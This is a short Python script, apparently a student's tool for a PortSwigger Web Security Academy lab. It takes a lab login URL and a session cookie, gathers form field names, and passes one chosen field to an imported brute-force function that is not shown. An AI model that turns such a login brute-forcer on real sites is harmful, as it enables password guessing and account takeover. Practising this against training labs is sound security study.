import requests
from Post_Method import *
url = "https://0a5200210369d72bd598f9d100f80049.web-security-academy.net/login"
headers = {"Cookie" : "session=OAu19Dg9CVaQe8S546IFmZUsLypdmveI"}
       
c = int(input("How many data : "))
d = []
for i in range(0,c):
    d.append(input("Data %d : " %(i)))
bf_data = int(input("Choose data to bf : "))
data = {}
for i in range(0,len(d)):
    if i != bf_data:
        add = {
            d[i] : input("%s : " %(d[i]))
        }
        data.update(add)
    else:
        add = {
            d[i] : "test"
        }
        data.update(add)

Post_Easy_Bf(url , headers, data, d , bf_data)